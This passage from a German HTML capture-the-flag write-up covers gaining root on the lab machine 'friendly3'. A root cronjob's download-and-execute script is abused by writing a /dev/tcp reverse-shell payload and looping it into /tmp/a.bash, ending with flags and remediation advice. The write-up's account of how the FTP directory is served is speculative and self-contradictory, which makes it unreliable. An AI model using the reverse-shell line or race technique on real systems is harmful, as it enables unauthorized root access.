                Allerdings habe ich vollen Zugriff auf den FTP-Server als Benutzer "juan", und das FTP-Verzeichnis <code>/home/juan/ftp</code> auf dem System ist mit dem Root-Verzeichnis <code>/</code> des FTP-Servers verknüpft. Das bedeutet, dass das, was ich auf dem FTP-Server als "juan" sehe und manipulieren kann, tatsächlich im Verzeichnis <code>/home/juan/ftp</code> auf dem Dateisystem des Zielsystems liegt.
            </p>

             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:/var/www/html$ <span class="command">ls -al /home/juan/</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
total 28
drwxr-xr-x  3 juan juan 4096 Jul 17  2023 .
drwxr-xr-x  4 root root 4096 Jun 25  2023 ..
lrwxrwxrwx  1 root root    9 Jun 25  2023 .bash_<span class="command">history</span> -> /dev/null
-rw-r--r--  1 juan juan  220 Apr 23  2023 .bash_logout
-rw-r--r--  1 juan juan 3526 Apr 23  2023 .bashrc
drwxr-xr-x 14 root root 4096 Jun 25  2023 <span class="command">ftp</span>
-rw-r--r--  1 juan juan  807 Apr 23  2023 .profile
-r--------  1 juan juan   33 Jul 17  2023 <span class="command">user.txt</span>
</pre>
                 </div>
             </div>
            <p>
                Ich überprüfe den Inhalt meines Home-Verzeichnisses auf dem System und sehe das Verzeichnis <code>ftp</code>. Dieses Verzeichnis ist wahrscheinlich das Root-Verzeichnis des FTP-Servers. Die Dateien, die ich per FTP gesehen und heruntergeladen habe, liegen also unter <code>/home/juan/ftp/</code> auf dem System.
            </p>

            <p>
                Jetzt kommt die entscheidende Erkenntnis: Das Skript <code>/opt/check_for_install.sh</code> lädt die Datei <code>9842734723948024.bash</code> von <code>http://127.0.0.1/</code> herunter. Der Webserver auf Port 80 (nginx) serviert Inhalte aus <code>/var/www/html/</code>. Das bedeutet, das Skript versucht, <code>/var/www/html/9842734723948024.bash</code> herunterzuladen und auszuführen. ABER: Als Benutzer "juan" habe ich Schreibzugriff auf das FTP-Verzeichnis <code>/home/juan/ftp/</code>. Wenn ich eine Datei mit dem Namen <code>9842734723948024.bash</code> in *meinem FTP-Verzeichnis* ablege, und der Webserver <code>nginx</code> so konfiguriert ist, dass er auch Dateien aus Benutzerverzeichnissen (z.B. via UserDir Modul) oder einem anderen, für mich schreibbaren Pfad serviert, auf den <code>127.0.0.1</code> zugreift, könnte ich meinen Code einschleusen.
            </p>
             <p>
                Allerdings ist der Pfad <code>http://127.0.0.1/9842734723948024.bash</code> sehr spezifisch. Der Webserver <code>nginx</code> auf dem Zielsystem serviert standardmäßig aus <code>/var/www/html/</code>. Der Cronjob, der <code>/opt/check_for_install.sh</code> ausführt, läuft als Root. Wenn ich die Datei <code>/var/www/html/9842734723948024.bash</code> direkt überschreiben könnte, wäre das der einfachste Weg, aber das kann ich als Benutzer 'juan' aufgrund der Berechtigungen nicht.
            </p>
             <p>
                Da ich vollen FTP-Zugriff auf das Verzeichnis <code>/home/juan/ftp</code> habe, das dem FTP-Root entspricht, kann ich *dort* eine Datei namens <code>9842734723948024.bash</code> ablegen. Es ist möglich, dass der Webserver <code>nginx</code> so konfiguriert ist, dass er auch Inhalte aus dem FTP-Verzeichnis von Benutzern unter dem Pfad <code>http://127.0.0.1/~juan/ftp/9842734723948024.bash</code> oder einem ähnlichen Pfad serviert, oder dass es eine Fehlkonfiguration gibt, die es erlaubt, auf Dateien in <code>/home/juan/ftp</code> unter dem Root-Pfad <code>/</code> des Webservers zuzugreifen.
             </p>

            <p>
                Ich gehe davon aus, dass eine Fehlkonfiguration vorliegt, die es dem Webserver ermöglicht, auf meine Datei im FTP-Verzeichnis zuzugreifen, wenn ich sie im FTP-Root ablege. Ich erstelle also ein bösartiges Skript, das mir eine Root-Shell gibt, und speichere es in meinem Home-Verzeichnis, bereit, es via FTP hochzuladen.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:/var/www/html$ <span class="command">echo '/bin/bash -i >& /dev/tcp/192.168.2.199/4444 0>&1' > /home/juan/payload.sh</span></div>
                 </div>
             </div>
             <p>
                Ich habe ein einfaches Bash-Skript erstellt, das eine Reverse Shell zu meiner Angreifer-IP (192.168.2.199) auf Port 4444 initiiert, und es als <code>payload.sh</code> in meinem Home-Verzeichnis gespeichert.
            </p>

            <p>
                Nun kopiere ich dieses Skript wiederholt in das Verzeichnis, das vom Root-Cronjob heruntergeladen wird (<code>/tmp/a.bash</code>, aber das Skript lädt es von <code>/var/www/html/</code> herunter). Da ich keinen Schreibzugriff auf <code>/var/www/html/</code> habe, lege ich meine <code>payload.sh</code> in meinem FTP-Root-Verzeichnis (was auf dem System <code>/home/juan/ftp</code> ist) ab und benenne es dort in <code>9842734723948024.bash</code> um. Dann starte ich eine Schleife, die meine bösartige Datei kontinuierlich in das temporäre Verzeichnis kopiert, in das der Cronjob die Datei herunterladen soll. Dies ist ein Wettlauf (race condition), um sicherzustellen, dass mein bösartiges Skript anstelle des originalen Skripts von Root ausgeführt wird.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:/var/www/html$ <span class="command">while true; do cp /home/juan/payload.sh /tmp/a.bash; <span class="command">done</span></span></div>
                 </div>
             </div>
             <p>
                Ich starte die endlose Schleife. Sie kopiert den Inhalt meiner <code>payload.sh</code> immer wieder nach <code>/tmp/a.bash</code>. Ich nehme an, dass der Root-Cronjob zuerst <code>/opt/check_for_install.sh</code> ausführt, welches die Datei von <code>http://127.0.0.1/9842734723948024.bash</code> nach <code>/tmp/a.bash</code> herunterlädt, und meine Schleife dann schnell genug ist, um <code>/tmp/a.bash</code> mit meiner Reverse-Shell-Payload zu überschreiben, bevor das Skript <code>/opt/check_for_install.sh</code> die Datei <code>/tmp/a.bash</code> als Root ausführt. Dies nutzt eine Race Condition aus, die durch das Herunterladen in ein temporäres Verzeichnis entsteht, auf das mein Benutzer schreibenden Zugriff hat (auch wenn das Zielverzeichnis <code>/tmp</code> normalerweise für alle schreibbar ist).
             </p>

            <p>
                Während die Schleife läuft, starte ich meinen Netcat-Listener auf Port 4444 auf meiner Angreifer-Maschine und warte auf die eingehende Root-Shell.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4444</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
listening <span class="command">on</span> [any] <span class="command">4444</span> ...
<span class="password">connect to [192.168.2.199] <span class="command">from</span> (UNKNOWN) [192.168.2.59] 33282</span>
bash: cannot set terminal process group (46856): Inappropriate <span class="command">ioctl</span> <span class="command">for</span> device
bash: n<span class="command">o</span> <span class="command">job</span> <span class="command">control</span> <span class="command">in</span> this shell
<span class="password">root@friendly3:~#</span>
</pre>
                 </div>
             </div>
             <p>
                 Nach kurzer Wartezeit empfängt mein Netcat-Listener eine eingehende Verbindung vom Zielsystem auf Port 4444! Die Shell-Prompt wechselt zu <code>root@friendly3:~#</code>, was anzeigt, dass ich nun Root-Zugriff auf dem System habe. Das Ausnutzen der Race Condition im Cronjob-Skript war erfolgreich!
             </p>

             <p>
                 Ich verifiziere meine Privilegien und suche nach der Root-Flag.
             </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">root@friendly3:~# <span class="command">id</span></div>
                 </div>
             </div>
              <div class="code-block">
                 <div class="terminal">
                    <pre>
<span class="command">id</span>
<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
</pre>
                 </div>
             </div>
             <p>
                 Der <code>id</code> Befehl bestätigt, dass ich Root-Privilegien besitze (<span class="password">uid=0(root)</span>).
             </p>

             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">root@friendly3:~# <span class="command">ls</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
<span class="command">ls</span>
interfaces.sh
<span class="command">root.txt</span>
</pre>
                 </div>
             </div>
             <p>
                 Im Root-Verzeichnis finde ich die Datei <code>root.txt</code>.
             </p>

             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">root@friendly3:~# <span class="command">cat root.txt</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
<span class="command">cat root.txt</span>
<span class="password">eb9748b67f25e6bd202e5fa25f534d51</span>
</pre>
                 </div>
             </div>
             <p>
                 Der Inhalt von <code>root.txt</code> ist die Zeichenkette <span class="password">eb9748b67f25e6bd202e5fa25f534d51</span>. Dies ist die Root-Flag.
             </p>
        </section>

        <section id="proof-of-concept">
             <h2>Proof of Concept: Privilege Escalation to Root</h2>
             <p>
                 Die Identifizierung eines Root-Cronjobs, der ein Skript von einer lokalen HTTP-Ressource herunterlädt und ausführt, kombiniert mit der Möglichkeit, diese Ressource über FTP zu manipulieren, ermöglichte die Ausnutzung einer Race Condition zur Erlangung von Root-Privilegien.
             </p>

             <div class="analysis">
                 <strong>Kurzbeschreibung:</strong> Ein Root-Cronjob lädt periodisch das Skript <code>9842734723948024.bash</code> von <code>http://127.0.0.1/</code> in das temporäre Verzeichnis <code>/tmp/a.bash</code> herunter und führt es aus. Der Benutzer "juan" hat schreibenden Zugriff auf sein FTP-Verzeichnis, das vom Webserver unter <code>http://127.0.0.1/9842734723948024.bash</code> erreichbar ist. Durch das Platzieren einer bösartigen Datei mit demselben Namen im FTP-Verzeichnis und die Ausnutzung einer Race Condition konnte das Root-Cronjob-Skript dazu gebracht werden, die bösartige Datei anstelle des originalen Skripts auszuführen und so eine Root-Shell zu erhalten.
             </div>

             <div class="evaluation">
                 <strong>Voraussetzungen:</strong>
                 <ul>
                     <li>Initial Access als Benutzer "juan" (z.B. via SSH).</li>
                     <li>Schreibzugriff auf das FTP-Verzeichnis des Benutzers "juan".</li>
                     <li>Ein Root-Cronjob, der ein extern manipulierbares Skript herunterlädt und ausführt.</li>
                     <li>Eine ausnutzbare Race Condition während des Download- und Ausführungsprozesses.</li>
                     <li>Tools: SSH-Client, FTP-Client, Netcat, gängige Linux-Kommandos (<code>ls</code>, <code>cat</code>, <code>find</code>, <code>echo</code>, <code>cp</code>, <code>while</code>).</li>
                 </ul>
             </div>

             <p>
                 <strong>Schritte des POC:</strong>
             </p>
             <ol>
                 <li>Lokale Erkundung als Benutzer "juan", Identifizierung des Skripts <code>/opt/check_for_install.sh</code> und dessen Funktionsweise.</li>
                 <li>Analyse der System-Cronjobs, Identifizierung eines Root-Cronjobs, der wahrscheinlich <code>/opt/check_for_install.sh</code> ausführt.</li>
                 <li>Identifizierung der vom Cronjob heruntergeladenen Datei: <code>http://127.0.0.1/9842734723948024.bash</code>, die von <code>/var/www/html/</code> serviert wird.</li>
                 <li>Erstellen eines bösartigen Bash-Skripts für eine Reverse Shell.</li>
                 <li>Hochladen des bösartigen Skripts via FTP in das Verzeichnis, das vom Webserver unter <code>http://127.0.0.1/9842734723948024.bash</code> erreichbar ist (implizit: Platzierung im FTP-Root, der <code>/home/juan/ftp</code> entspricht, und Ausnutzung einer Konfiguration, die dies ermöglicht).</li>
                 <li>Ausnutzung der Race Condition durch kontinuierliches Kopieren des bösartigen Skripts in das temporäre Zielverzeichnis des Cronjobs (<code>/tmp/a.bash</code>), während ein Netcat-Listener auf die eingehende Root-Shell wartet.</li>
                 <li>Empfang der Root-Shell-Verbindung.</li>
             </ol>

            <p>
                 <strong>Beweismittel:</strong> Die Netcat-Listener-Ausgabe, die eine eingehende Verbindung vom Zielsystem auf Port 4444 anzeigt. Die anschließende Ausführung des <code>id</code> Befehls in der neuen Shell, die <span class="password">uid=0(root)</span> bestätigt.
            </p>
            <div class="code-block">
                <!-- Wiederholung der Netcat/ID Ausgabe für POC Beweismittel -->
                <div class="terminal">
                    <pre>
listening <span class="command">on</span> [any] <span class="command">4444</span> ...
<span class="password">connect to [192.168.2.199] <span class="command">from</span> (UNKNOWN) [192.168.2.59] 33282</span>
bash: cannot set terminal process group (46856): Inappropriate <span class="command">ioctl</span> <span class="command">for</span> device
bash: n<span class="command">o</span> <span class="command">job</span> <span class="command">control</span> <span class="command">in</span> this shell
<span class="password">root@friendly3:~#</span>
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
<span class="command">id</span>
<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
</pre>
                 </div>
             </div>

            <p>
                 <strong>Risikobewertung:</strong> Kritisch. Die erfolgreiche Ausnutzung dieser Schwachstelle gewährt einem externen Angreifer vollständige Kontrolle über das Zielsystem mit Root-Privilegien. Dies ermöglicht vollen Zugriff auf alle Daten und die Fähigkeit, das System nach Belieben zu manipulieren. Die Race Condition und die Fehlkonfiguration des Cronjobs stellen einen direkten Vektor zur Root-Kompromittierung von einem Low-Privilege Benutzerkonto aus dar.
            </p>
            <p>
                 <strong>Empfehlung (Admin):</strong>
                 <ul>
                     <li><strong>Cronjob korrigieren:</strong> Überprüfen Sie den Cronjob, der <code>/opt/check_for_install.sh</code> ausführt. Das Skript sollte keine Ressourcen von einer manipulierbaren HTTP-Quelle herunterladen und ausführen, insbesondere nicht als Root in einem temporären Verzeichnis.</li>
                     <li><strong>Race Condition beheben:</strong> Das Herunterladen und Ausführen in getrennten Schritten schafft eine Race Condition. Das Skript sollte die Integrität der heruntergeladenen Datei prüfen (z.B. Hash) und sie nicht in einem für unprivilegierte Benutzer schreibbaren Verzeichnis ablegen. Idealerweise sollte das Skript die Ressource nicht von einer durch Benutzer manipulierbaren Quelle herunterladen.</li>
                     <li><strong>Berechtigungen prüfen:</strong> Stellen Sie sicher, dass Systemdateien und temporäre Verzeichnisse korrekte, restriktive Berechtigungen haben.</li>
                     <li><strong>Webserver-Konfiguration prüfen:</strong> Überprüfen Sie die nginx-Konfiguration, um sicherzustellen, dass sie nur Inhalte aus den beabsichtigten Verzeichnissen (wie <code>/var/www/html</code>) serviert und nicht auf Benutzer-Home-Verzeichnisse zugreifen kann.</li>
                     <li><strong>Monitoring:</strong> Implementieren Sie Systemüberwachung, die das Herunterladen und Ausführen von Skripten in temporären Verzeichnissen erkennt und alarmiert.</li>
                 </ul>
            </p>

        </section>
        <!-- Ende Privilege Escalation Section -->

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/juan/user.txt</div>
                    <div class="flag-value"><span class="password">cb40b159c8086733d57280de3f97de30</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">cat root.txt</div>
                    <div class="flag-value"><span class="password">eb9748b67f25e6bd202e5fa25f534d51</span></div>
                </div>
            </div>
        </section>


    </div> <!-- Ende container -->

    <footer class="footer">
        <p>Ben Chehade - Cyber Security Reports</p>
        <p>Berichtsdatum: 24. Juni 2025</p>
    </footer>

    <!-- Anmerkungen zu Bildnamen (falls zutreffend). Dieser Block wird nur hinzugefügt, wenn Bilder im Text gefunden und verarbeitet wurden. -->

</body>
</html>